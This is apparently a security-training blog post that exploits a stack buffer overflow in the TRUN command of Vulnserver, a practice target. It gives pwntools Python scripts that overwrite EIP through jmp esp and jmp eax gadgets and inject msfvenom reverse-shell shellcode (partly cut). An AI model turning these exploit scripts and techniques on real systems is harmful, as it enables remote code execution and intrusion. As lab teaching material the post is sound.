---
title: "Vulnserver: Buffer overflow in TRUN command"
date: 2019-08-02
---

In this post we are going to analyze the crash we found previously in the TRUN command of Vulnserver by using our fuzzer. And we are also going to look at different ways of exploiting it.<!--more-->

# Analyzing the crash
As a reminder, the registers in Immunity Debugger looked like in the image below after the crash.

{{img(id="img/immunitydbg1.PNG" class="textCenter")}}

From that we can see that we probably control EIP and we can also obtain the string we send to the application from the EAX register. So if we extract the string we obtain the following:

```bash
TRUN /.:/AAAAAAAAAAAAAAAAAAA... # There's supposed to be 5000 As here
```

Our next step is going to be what is the offset in which we overwrite EIP so that we can control it properly. To do that we will use python and [pwntools](https://github.com/Gallopsled/pwntools), a python library that will help us in exploit development. We can simply install it by running **pip install pwntools** in the terminal in our Kali VM and we can check if it's intalled correctly simply by running **pwn update**.

{{img(id="img/pwntools1.PNG" class="textCenter")}}

To get the offset of EIP we are going to substitute the sequence of 5000 As with a de Bruijn sequence which we will generate by using pwntools by running **pwn cyclic 5000** in the terminal. We can copy the output and then give it to Vulnserver manually by using netcat, make sure you are debugging the application with Immunity Debugger so that we cna analyze the crash.

{{img(id="img/vulnserver1.PNG" class="textCenter")}}

Now if we look at the debugger there's a crash and in the Registers window we can see that now EIP is equal to 61616275, this number is part of our de Bruijn sequence but its represented in hexadecimal. To obtain its position in the sequence we can use pwntools again by running **pwn cyclic -l 0x61616275**, we appended *0x* to the beginning of our number to signal its in hex.

{{img(id="img/immunitydbg2.PNG" class="textCenter")}}

{{img(id="img/pwntools2.PNG" class="textCenter")}}

Now that we know our offset is 2003 let's test it by changing EIP to something easy to spot like 0xcafebabe. To make our job easier let's write a script in python using pwntools that connects to Vulnserver and sends the command.

```python
from pwn import *

# IP and port of the target (Vulnserver).
ip = "192.168.1.46"
port = 9999 

# Define the variables with the data we obtained.
cmd = "TRUN /.:/" # Command used and start of payload.
offset_eip = 2003 + len(cmd)
eip = 0xcafebabe # Address we want to overwrite EIP with.

# Create our payload.
payload = fit({
    0:cmd,
    offset_eip:eip,
    },length=5000)

# Connect to the target and send the payload.
io = remote(ip,port)
io.readline()
io.sendline(payload)
```

Once we execute this script with python we produce a crash and if we check the debugger we can see that the EIP overwrite has worked corretly.

{{img(id="img/immunitydbg3.PNG" class="textCenter")}}

# Exploiting
So finally it's time to start the fun part, executing whatever code we want in the victim. First we have to think where can we write the code we want to execute and how to move the execution to it. And in this case we have two options that we can see in the screen above, EAX which points to the beginning of our string or ESP which points to "aauf..." which if we check with **pwn cyclic -l aauf** is at offset 2017.

## Using ESP
Let's start with the option of using ESP since it's a bit easier, to do that we need to write our shellcode in the offset where ESP is pointing at and find an address in Vulnserver's execution that points to a jmp esp instruction. To achieve the later we can use the plugin mona.py in Immunity Debugger with the command **!mona jmp -r esp** and it will show us in the log all the different addresses we can use.

{{img(id="img/immunitydbg3.PNG" class="textCenter")}}

So let's choose one of those addresses, for example 0x625011af and know we need to find some shellcode to execute, we can look for something on the internet like for example in [shell-storm](http://shell-storm.org/shellcode/) or even better we can create our own with the metasploit tool msfvenom.

{{img(id="img/msfvenom1.PNG" class="textCenter")}}

Now what's left is simply putting together all the different parts which we can see in the code below.

```python
from pwn import *

# IP and port of the target (Vulnserver).
ip = "192.168.1.46"
port = 9999 

# Define the variables with the data we obtained.
cmd = "TRUN /.:/" # Command used and start of payload.
offset_eip = 2003 + len(cmd)
eip = 0x625011af # Address we want to overwrite EIP with, jmp esp in this case.

# Here we put the shellcode we want to execute.
offset_sc = 2017 # Offset of ESP.
shellcode =  "\x90"*15 # NOP sled for conflicts with the shellcode using the stack.
shellcode += "\xda\xc7\xb8\x19\xda\x3b\xc4\xd9\x74\x24\xf4\x5b"
shellcode += "\x2b\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\xda"
# ... shellcode keeps going but it's cut for brevity.

# Create our payload.
payload = fit({
    0:cmd,
    offset_eip:eip,
    offset_sc:shellcode,
    },length=5000)

# Connect to the target and send the payload.
io = remote(ip,port)
io.readline()
io.sendline(payload)
```

After that we can set up a listener with netcat in port 4444 in our Kali VM and execute the python script. If you did everything correctly you should be able to see the following:

{{img(id="img/pwned1.PNG" class="textCenter")}}

## Using EAX
This case is really similar to using ESP but we have to take into account that it's pointing to the beginning of the string and we can't modify the "TRUN /.:/" part since it's the one that runs the command. We need to find a jmp eax plus a value bigger than 9 or we also have another option, if we treat "TRUN /.:/", *54 52 55 4e 20 2f 2e 3a 2f* in hex, as instructructions, we can see that they don't actually modify the flow of our shellcode. We can disassemble them using the coommand **pwn disasm 54 52 55 4e 20 2f 2e 3a 2f**.

{{img(id="img/pwntools3.PNG" class="textCenter")}}

So we just need to modify our previous code with the necessary offsets and addresses we obtain like in the previous method and our script will look something like this:

```python
from pwn import *

# IP and port of the target (Vulnserver).
ip = "192.168.1.45"
port = 9999 

# Define the variables with the data we obtained.
cmd = "TRUN /.:/" # Command used and start of payload.
offset_eip = 2003 + len(cmd)
eip = 0x625011b1 # Address we want to overwrite EIP with, jmp eax in this case.

# Here we put the shellcode we want to execute.
shellcode =  "\x90"*16 # NOP sled for safety.
shellcode += "\x89\xC4\x83\xEC\x7C" # mov esp,eax; sub esp,0x7c
shellcode += "\xda\xc7\xb8\x19\xda\x3b\xc4\xd9\x74\x24\xf4\x5b"
shellcode += "\x2b\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\xda"
# ... shellcode keeps going but it's cut for brevity.

# Create our payload.
payload = fit({
    0:cmd + shellcode,
    offset_eip:eip,
    },length=5000)

# Connect to the target and send the payload.
io = remote(ip,port)
io.readline()
io.sendline(payload)
```

A really important point to make is that we added the instructions **mov esp,eax; sub esp,0x7c** to the beginning of our shellcode so that we don't get our shellcode overwriten when it uses the stack, the value *0x7c* is really important since it has to be a multiple of 4 to keep the stack aligned or some library calls will produce an error.

And that's it guys, see you in the next post!